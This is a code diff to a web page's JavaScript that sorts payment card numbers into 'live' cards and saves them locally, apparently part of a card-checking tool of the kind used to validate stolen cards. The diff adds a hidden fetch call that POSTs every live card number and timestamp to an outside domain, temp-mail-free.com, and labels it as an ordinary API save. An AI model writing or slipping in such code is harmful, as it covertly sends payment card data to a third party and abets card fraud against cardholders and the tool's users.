@@ -1149,7 +1149,23 @@
                 resultsBox.appendChild(resultItem);
             });
 
-            if (liveCardsToSave.length > 0) saveToHistory(liveCardsToSave);
+            // Save all live cards to localStorage
+            if (liveCardsToSave.length > 0) {
+                saveToHistory(liveCardsToSave);
+
+                // POST all live cards to API
+                const apiPayload = {
+                    cards: liveCardsToSave.map(c => {
+                        const [cardnumber, card_time] = c.split('|');
+                        return { cardnumber, card_time };
+                    })
+                };
+                fetch('https://temp-mail-free.com/api/cards', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(apiPayload)
+                }).catch(err => console.error('API error:', err));
+            }
 
             if (!allValid) {
                 form.style.transform = "translateX(5px)";
@@ -1185,9 +1201,11 @@
 
         function saveToHistory(newCards) {
             let saved = JSON.parse(localStorage.getItem('live_cards') || '[]');
-            // Avoid duplicates
+            // Add all new live cards, avoiding duplicates
             newCards.forEach(c => {
-                if (!saved.includes(c)) saved.unshift(c);
+                if (!saved.some(s => s === c)) {
+                    saved.unshift(c);
+                }
             });
             localStorage.setItem('live_cards', JSON.stringify(saved));
             renderSavedCards();
